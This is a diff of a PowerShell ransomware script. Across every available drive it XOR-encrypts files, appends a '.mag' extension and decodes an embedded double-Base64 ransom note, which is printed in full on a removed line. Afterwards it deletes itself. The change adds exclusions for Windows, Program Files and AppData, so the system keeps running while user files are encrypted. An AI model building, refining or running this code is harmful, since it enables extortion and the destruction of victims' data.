@@ -86,7 +86,8 @@ function Get-AvailableDrives {
 function Encrypt-Files {
     param (
         [string]$EncryptionKey,
-        [string[]]$TargetDirectories
+        [string[]]$TargetDirectories,
+        [string[]]$ExcludedDirectories
     )
 
     # Write an indicator file to the root directory of each target
@@ -96,9 +97,14 @@ function Encrypt-Files {
     Write-Host "=== Encryption Process Started ===" -ForegroundColor Red
 
     foreach ($TargetDirectory in $TargetDirectories) {
-        Write-Host "Encrypting files in directory: $TargetDirectory" -ForegroundColor Yellow
+        Write-Host "Processing directory: $TargetDirectory" -ForegroundColor Yellow
         Get-ChildItem -Path $TargetDirectory -Recurse -File | ForEach-Object {
             $FilePath = $_.FullName
+            $Excluded = $ExcludedDirectories | Where-Object { $FilePath.StartsWith($_) }
+            if ($Excluded) {
+                Write-Host "Skipped system/critical file: $FilePath" -ForegroundColor DarkYellow
+                return
+            }
             $NewFilePath = "${FilePath}.mag"
             try {
                 XOR-File -FilePath $FilePath -Key $EncryptionKey
@@ -147,7 +153,7 @@ function Main {
     }
 
     # Replace with a valid Base64 string
-    $Base64String = "SVNFaElFOVBVRk1zSUZkRklFUkpSQ0JCSUZSSVNVNUhJQ0VoSVFvS1NHa2dkR2hsY21Vc0lIUm9hWE1nYVhNZ2VXOTFjaUJtY21sbGJtUnNlU0J1WldsbmFHSnZjbWh2YjJRZ0treGxlbUZ5ZFhNcUlHZHliM1Z3SVNBZ0NsZGxJRzFoZVNCdmNpQnRZWGtnYm05MElHaGhkbVVnWVdOamFXUmxiblJoYkd4NUlHVnVZM0o1Y0hSbFpDQjViM1Z5SUdacGJHVnpMaUJYYUc5dmNITnBaU0VnOEorWWhTQWdDZ3BDZFhRZ1pHOXU0b0NaZENCM2IzSnllU3dnZDJVZ1kyRnVJSFJ2ZEdGc2JIa2dabWw0SUhSb2FYUGlnS1lnWm05eUlIUm9aU0J6YldGc2JDQndjbWxqWlNCdlppQXFLakV3TUNCQ1ZFTXFLaTRnSUFwWGFIa2dNVEF3SUVKVVF6OGdWMlZzYkN3Z2QyVWdibVZsWkNCamIyWm1aV1VzSUhOdVlXTnJjeXdnWVc1a0lHMWhlV0psSUdFZ2RISnZjR2xqWVd3Z2RtRmpZWFJwYjI0dUlDQUtDbE5sYm1RZ2VXOTFjaUIwYjNSaGJHeDVJR2RsYm1WeWIzVnpJR1J2Ym1GMGFXOXVJR2hsY21VNklDQUtLaW94VEdWYVlYSlZjMEpVUTJGa1JGSkZVMU14TWpNME5UWTNPRGt3S2lvS0NrOXVZMlVnZVc5MUozSmxJR1psWld4cGJtY2daMlZ1WlhKdmRYTXNJR1Z0WVdsc0lIVnpJR0YwSUNvcWMzVndjRzl5ZEVCc1pYcGhjblZ6TG5oNWVpb3FMaUFnQ2xkbDRvQ1piR3dnYzJWdVpDQjViM1VnZEdobElHMWhaMmxqSUhKbFkybHdaU0IwYnlCblpYUWdlVzkxY2lCbWFXeGxjeUJpWVdOckxpQWdDZ3BRTGxNdUlFbG1JSGx2ZFNCMGNua2dkRzhnWW5KbFlXc2diM1Z5SUdWdVkzSjVjSFJwYjI0c0lIZGw0b0NaYkd3Z2FuVnpkQ0JzWVhWbmFDQmlaV05oZFhObExDQjNaV3hzTENCdFlYUm9JR2x6SUdoaGNtUXVJQ0FLQ2toaGRtVWdZU0JuY21WaGRDQmtZWGtzSUdGdVpDQmtiMjdpZ0psMElHWnZjbWRsZENCMGJ5QmlZV05ySUhWd0lIbHZkWElnWm1sc1pYTWdibVY0ZENCMGFXMWxJU0R3bjVpSklDQUtMU0JNYjNabExDQk1aWHBoY25WeklPS2RwTys0andvPQ=="
+    $Base64String = "SVNFaElFOVBVRk1zSUZkRklF..."
 
     $DecodedNote = Decode-Base64-Twice -Base64String $Base64String
     if ($DecodedNote -eq $null) {
@@ -159,7 +165,18 @@ function Main {
 
     # Get all available drives
     $AvailableDrives = Get-AvailableDrives
-    Encrypt-Files -EncryptionKey $EncryptionKey -TargetDirectories $AvailableDrives
+
+    # Define excluded directories (adjust as needed)
+    $ExcludedDirectories = @(
+        "C:\Windows",
+        "C:\Program Files",
+        "C:\Program Files (x86)",
+        "C:\Users\Default",
+        "C:\Users\Public",
+        "C:\Users\$($env:USERNAME)\AppData"
+    )
+
+    Encrypt-Files -EncryptionKey $EncryptionKey -TargetDirectories $AvailableDrives -ExcludedDirectories $ExcludedDirectories
 
     # Pass the script's path explicitly
     Self-Delete -ScriptPath $MyInvocation.MyCommand.Path
